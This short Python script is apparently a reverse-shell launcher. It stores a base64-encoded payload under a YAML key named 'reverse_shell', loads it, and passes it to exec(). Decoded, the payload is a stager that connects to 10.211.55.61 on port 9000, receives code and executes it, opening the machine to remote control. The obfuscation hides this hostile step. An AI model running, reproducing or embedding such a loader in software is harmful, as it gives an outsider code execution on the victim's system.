# -*- coding: utf-8 -*-

import yaml

YAML = '''
hello: world
how:
 - are
 - you

reverse_shell: !!binary "aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMC4yMTEuNTUuNjEnLDkwMDApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK"
'''


def main():
	y = yaml.load(YAML)

	exec(y['reverse_shell'])


if __name__ == '__main__':
	main()
